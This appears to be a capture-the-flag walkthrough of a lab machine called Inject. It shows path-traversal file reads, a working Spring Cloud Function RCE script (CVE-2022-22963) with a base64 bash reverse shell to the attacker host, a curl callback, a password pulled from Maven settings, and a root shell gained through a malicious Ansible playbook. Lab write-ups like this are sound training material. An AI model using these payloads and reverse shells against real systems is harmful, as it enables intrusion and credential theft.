We find a web app which leave us upload photos

![[Pasted image 20231004135943.png]]

After upload a png file we can view our image

![[Pasted image 20231004140036.png]]

And with LFI we can retrieve files from the server

```bash
┌──(kali㉿kali)-[~/Documents/Academy/File-Inclusion]
└─$ curl http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```

The important users:

```plain/text
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

With LFI we retrieve the pom.xml file

```bash
┌──(kali㉿kali)-[~/Documents/Academy/File-Inclusion]
└─$ curl http://10.10.11.204:8080/show_image?img=../../../../../../../../../../var/www/WebApp/pom.xml

<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
        <modelVersion>4.0.0</modelVersion>
        <parent>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-parent</artifactId>
                <version>2.6.5</version>
                <relativePath/> <!-- lookup parent from repository -->
        </parent>
        <groupId>com.example</groupId>
        <artifactId>WebApp</artifactId>
        <version>0.0.1-SNAPSHOT</version>
        <name>WebApp</name>
        <description>Demo project for Spring Boot</description>
        <properties>
                <java.version>11</java.version>
        </properties>
        <dependencies>
                <dependency>
                        <groupId>com.sun.activation</groupId>
                        <artifactId>javax.activation</artifactId>
                        <version>1.2.0</version>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-thymeleaf</artifactId>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-web</artifactId>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-devtools</artifactId>
                        <scope>runtime</scope>
                        <optional>true</optional>
                </dependency>
                <dependency>
                        <groupId>org.springframework.cloud</groupId>
                        <artifactId>spring-cloud-function-web</artifactId>
                        <version>3.2.2</version>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-test</artifactId>
                        <scope>test</scope>
                </dependency>
                <dependency>
                        <groupId>org.webjars</groupId>
                        <artifactId>bootstrap</artifactId>
                        <version>5.1.3</version>
                </dependency>
                <dependency>
                        <groupId>org.webjars</groupId>
                        <artifactId>webjars-locator-core</artifactId>
                </dependency>
        </dependencies>
        <build>
                <plugins>
                        <plugin>
                                <groupId>org.springframework.boot</groupId>
                                <artifactId>spring-boot-maven-plugin</artifactId>
                                <version>${parent.version}</version>
                        </plugin>
                </plugins>
                <finalName>spring-webapp</finalName>
        </build>
</project>
```

Checking the dependencies (the ones with version) we found the following exploit

```bash
┌──(kali㉿kali)-[~/Documents/Academy/File-Inclusion]
└─$ searchsploit spring cloud 3.2.2
----------------------------------------------------------------- 
 Exploit Title                                                   | 
----------------------------------------------------------------- 
Spring Cloud 3.2.2 - Remote Command Execution (RCE)              | java/webapps/51577.py
----------------------------------------------------------------- 
Shellcodes: No Results
Papers: No Results
```

After execute we find that it is throwing an error

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Inject-10.10.11.204]
└─$ python 51577.py --url http://10.10.11.204:8080/functionRouter --command whoami                             

[!] It is possible that the output of the injected command is not reflected in the response, to validate if the server is vulnerable run a ping or curl to the attacking host                                                                                 
{
  "timestamp": "2023-10-04T12:37:53.512+00:00",
  "status": 500,
  "error": "Internal Server Error",
  "message": "EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String",                
  "path": "/functionRouter"                                                                                                    
}
```

But we don't know if the command is executing, so we open a python server and lets see if we receive a response

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Inject-10.10.11.204]
└─$ python 51577.py --url http://10.10.11.204:8080/functionRouter --command 'curl http://10.10.14.22/shell.php'        

[!] It is possible that the output of the injected command is not reflected in the response, to validate if the server is vulnerable run a ping or curl to the attacking host

{
  "timestamp": "2023-10-04T12:37:08.729+00:00",
  "status": 500,
  "error": "Internal Server Error",
  "message": "EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String",                
  "path": "/functionRouter"
} 

------------------------------------------

┌──(kali㉿kali)-[~/Documents/Boxes/Inject-10.10.11.204]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

10.10.11.204 - - [04/Oct/2023 14:37:08] "GET /shell.php HTTP/1.1" 200 -
```

We got the GET request in our python server, so the command is executing. After a few attempts to ping, it seems working but no reverse shell worked so we modify the script to run the command in base64 to avoid loosing something in the command due to encoding or something similar

```python
# Exploit Title: Spring Cloud 3.2.2 - Remote Command Execution (RCE)
# Description: Exploit to execute commands exploiting CVE-2022-22963
# CVE: CVE-2022-22963

import requests, argparse, json

# base64 = bash -i >& /dev/tcp/10.10.14.22/1337 0>&1
headers = {"spring.cloud.function.routing-expression": 'T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi8xMzM3IDA+JjE=}|{base64,-d}|{bash,-i}")' }
data = {"data": ""}

request = requests.post('http://10.10.11.204:8080/functionRouter', data=data, headers=headers)
response = json.dumps(json.loads(request.text), indent=2)
print(response)
```

And executing the script we got the shell

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Inject-10.10.11.204]
└─$ python 51577-2.py
{
  "timestamp": "2023-10-05T07:57:41.302+00:00",
  "status": 500,
  "error": "Internal Server Error",
  "message": "EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String",
  "path": "/functionRouter"
}

---------------------------------------

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.204] 51652
bash: cannot set terminal process group (828): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ whoami
frank
```

We can get the same building the request with ZAP or Burp

![[Pasted image 20231005102131.png]]

Don't forget to include something in the body, because it would fail if you won't

Now we are logged as frank user, but we can't read the user flag. With linpeas we found the following find containing phil password

```bash
frank@inject:/$ cat /home/frank/.m2/settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>

-----------------

frank@inject:/$ su phil                
Password: DocPhillovestoInject123
phil@inject:/$ whoami
phil
```

Now lets escalate privileges. With pspy we found the root user (UID=0) executing the following commands

```bash
2023/10/05 08:46:01 CMD: UID=0     PID=39750  
/bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/ 

2023/10/05 08:46:01 CMD: UID=0     PID=39749  
/usr/sbin/CRON -f

2023/10/05 08:46:01 CMD: UID=0     PID=39752  
/usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml

2023/10/05 08:46:01 CMD: UID=0     PID=39754
/usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml
```

It seems like a cronjob executing automation tasks specified in `/opt/automation/tasks` and then processing them with the binary `ansible-parallel` and `ansible-playbook`. 

```bash
phil@inject:/$ cat /opt/automation/tasks/playbook_1.yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
      
phil@inject:/$ ls -la /opt/automation/tasks
total 12
drwxrwxr-x 2 root staff 4096 Oct  5 08:50 .
drwxr-xr-x 3 root root  4096 Oct 20  2022 ..
-rw-r--r-- 1 root root   150 Oct  5 08:50 playbook_1.yml
phil@inject:/$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
```

We can't modify the file but we are owners of the folder (inherited from staff group) so we can create another yml file and establish a reverse shell in there. We asked to chatGPT how to modify the yml file to execute a shell command

```plain/text
what is this file

- hosts: localhost tasks: - name: Checking webapp service ansible.builtin.systemd: name: webapp enabled: yes state: started

ChatGPT

The text you've provided appears to be a snippet of an Ansible playbook written in YAML format. Ansible is an open-source automation tool that is used for configuration management, application deployment, and task automation. Playbooks are a key component of Ansible, and they define a set of tasks to be executed on a target system.

[SNIP]

how to execute a shell command in a snippet of an Ansible playbook written in YAML

ChatGPT

To execute a shell command in an Ansible playbook, you can use the `ansible.builtin.command` module or the shortcut `ansible.builtin.shell` module. Here's how you can modify your Ansible playbook snippet to execute a shell command...

[SNIP]
```

So we modify the snippet as the following

```bash
phil@inject:/$ vim /opt/automation/tasks/playbook_2.yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.22/1234 0>&1'

-------------------------

┌──(kali㉿kali)-[~/Documents/Resources]
└─$ nc -lvnp 1234         
listening on [any] 1234 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.204] 38408
bash: cannot set terminal process group (40598): Inappropriate ioctl for device
bash: no job control in this shell
root@inject:/opt/automation/tasks# whoami
root
```

And we are root